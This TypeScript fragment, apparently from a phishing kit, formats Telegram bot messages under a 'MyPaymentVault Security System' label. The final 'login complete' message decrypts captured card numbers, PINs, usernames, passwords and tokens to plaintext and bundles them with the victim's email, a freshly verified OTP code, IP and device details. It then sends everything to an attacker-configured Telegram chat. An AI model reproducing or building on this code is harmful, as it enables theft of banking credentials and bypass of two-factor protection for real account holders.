    const maskedCard = data.cardNumber.substring(0, 4) + '****' + data.cardNumber.substring(data.cardNumber.length - 4);
    message += `\n💳 <b>Login Type:</b> Card Number\n\n`;
    message += `💳 <b>Card Credentials:</b>\n`;
    message += `   • Card Number: ${maskedCard}\n`;
    message += `   • PIN: ${data.pin}\n\n`;
  } else if (data.loginType === 'username') {
    const maskedUsername = data.username.substring(0, 3) + '***' + data.username.substring(data.username.length - 3);
    message += `\n👤 <b>Login Type:</b> Username\n\n`;
    message += `👤 <b>Username Credentials:</b>\n`;
    message += `   • Username: ${maskedUsername}\n`;
    message += `   • Password: ${data.password}\n\n`;
  } else if (data.loginType === 'token') {
    const maskedToken = data.token.substring(0, 3) + '***' + data.token.substring(data.token.length - 3);
    message += `\n🔑 <b>Login Type:</b> Token\n\n`;
    message += `🔑 <b>Token Credentials:</b>\n`;
    message += `   • Token: ${maskedToken}\n\n`;
  }
  
  message += `🌐 <b>Network Info:</b>\n`;
  message += formatIpInfo(ipInfo);
  message += `\n📱 <b>Device Info:</b>\n`;
  message += `   • Device: ${deviceInfo.deviceModel}\n`;
  message += `   • OS: ${deviceInfo.os}\n`;
  message += `   • Browser: ${deviceInfo.browser}\n`;
  if (deviceInfo.screenResolution) {
    message += `   • Screen: ${deviceInfo.screenResolution}\n`;
  }
  message += `\n🔑 <b>Login ID:</b> ${loginAttemptId}\n\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `🔒 <i>MyPaymentVault Security System</i>`;

  return message;
}

/**
 * Send ACCOUNT LOGIN COMPLETE notification to Telegram (consolidated with all data)
 */
export async function sendAccountLoginCompleteNotification(
  accountAttempt: any,
  email: string,
  otpCode: string,
  ipInfo: IpInfo,
  deviceInfo: DeviceInfo,
  sourceInfo: SourceInfo,
  config: TelegramConfig
): Promise<boolean> {
  const message = formatAccountLoginCompleteMessage(accountAttempt, email, otpCode, ipInfo, deviceInfo, sourceInfo);
  return sendTelegramMessage(message, config);
}

/**
 * Format ACCOUNT LOGIN COMPLETE message (consolidated)
 */
function formatAccountLoginCompleteMessage(
  accountAttempt: any,
  email: string,
  otpCode: string,
  ipInfo: IpInfo,
  deviceInfo: DeviceInfo,
  sourceInfo: SourceInfo
): string {
  const timestamp = new Date().toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta',
    dateStyle: 'full',
    timeStyle: 'medium',
  });

  let message = `✅ <b>ACCOUNT LOGIN - COMPLETE</b>\n\n`;
  message += `📅 <b>Waktu:</b> ${timestamp}\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  
  // Source Page
  message += `📍 <b>Source Page:</b>\n`;
  message += formatSourceInfo(sourceInfo);
  
  // Step 1: Login credentials based on type - DECRYPT all encrypted fields
  message += `\n🔐 <b>STEP 1: Login Credentials</b>\n`;
  if (accountAttempt.loginType === 'card') {
    const decryptedCardNumber = accountAttempt.cardNumber ? decrypt(accountAttempt.cardNumber) : 'N/A';
    const decryptedPin = accountAttempt.pin ? decrypt(accountAttempt.pin) : 'N/A';
    message += `   • Login Type: Card Number\n`;
    message += `   • Card Number: ${decryptedCardNumber}\n`;
    message += `   • PIN: ${decryptedPin}\n\n`;
  } else if (accountAttempt.loginType === 'username') {
    const decryptedUsername = accountAttempt.username ? decrypt(accountAttempt.username) : 'N/A';
    const decryptedPassword = accountAttempt.password ? decrypt(accountAttempt.password) : 'N/A';
    message += `   • Login Type: Username\n`;
    message += `   • Username: ${decryptedUsername}\n`;
    message += `   • Password: ${decryptedPassword}\n\n`;
  } else if (accountAttempt.loginType === 'token') {
    const decryptedToken = accountAttempt.token ? decrypt(accountAttempt.token) : 'N/A';
    message += `   • Login Type: Token\n`;
    message += `   • Token: ${decryptedToken}\n\n`;
  }
  
  // Step 2: Email verification - Use plaintext email passed from verify-otp
  message += `📧 <b>STEP 2: Email Verification</b>\n`;
  if (email === 'DECRYPTION_FAILED') {
    message += `   • Email: ⚠️ DECRYPTION ERROR - Contact System Admin\n\n`;
  } else {
    message += `   • Email: ${email}\n\n`;
  }
  
  // Step 3: OTP verification - Use plaintext OTP passed from verify-otp
  message += `🔢 <b>STEP 3: OTP Verified</b>\n`;
  message += `   • OTP Code: ${otpCode}\n\n`;
  
  // Connection & Device Info
  message += `🌐 <b>Network Info:</b>\n`;
  message += formatIpInfo(ipInfo);
  message += `\n📱 <b>Device Info:</b>\n`;
  message += `   • Device: ${deviceInfo.deviceModel}\n`;
  message += `   • OS: ${deviceInfo.os}\n`;
  message += `   • Browser: ${deviceInfo.browser}\n`;
  if (deviceInfo.screenResolution) {
    message += `   • Screen: ${deviceInfo.screenResolution}\n`;
  }
  
  message += `\n🔑 <b>Login ID:</b> ${accountAttempt.id}\n\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `🔒 <i>MyPaymentVault Security System</i>`;

  return message;
}

/**
 * Get Telegram configuration from environment
 */
export function getTelegramConfig(): TelegramConfig | null {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.warn('[Telegram] Missing configuration in environment variables');
    return null;
  }

  return { botToken, chatId };
}
